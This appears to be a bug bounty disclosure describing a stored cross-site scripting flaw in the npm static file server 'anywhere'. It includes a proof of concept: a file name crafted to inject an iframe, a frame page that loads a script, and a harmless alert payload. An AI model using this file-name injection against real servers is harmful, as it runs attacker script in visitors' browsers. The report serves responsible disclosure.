## Vulnerability Information
Hi Guys,

**anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.

**Module:** 

Running static file server anywhere.

https://www.npmjs.com/package/anywhere

**Description**



To embed malicious ```<script>``` tag with JavaScript code to execute, ```/``` character is necessary.
In all operating systems, ```/``` is not allowed as a character used in file name. This means there is very few option to craft an attack using file name as injection point.

## Steps To Reproduce:

However, if attacker wants to, one can still use some tricks and change one of the filenames into something like following example:

```
"><iframe src="malware_frame.html">
```

Then, HTML file with following content have to be saved in the same directory as file with the name changed:

```html
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="malware.js"></script>
</body>

</html>
```

An ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.
On my local machine, ```malware.js``` has following content:

```javascript
alert('Uh oh, I am very bad malware!')
```

Now, if you run ```anywhere``` in directory where both file with filename changed and ```malware_frame.html``` are saved:

```
$ ./node_modules/anywhere/bin/anywhere -p 8080
Running at http://192.168.1.1:8080/
Also running at https://192.168.1.1:8081/
```

and open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed:

{F257400}

## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you

## Impact

Exploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```anywhere``` is used to serve static content.
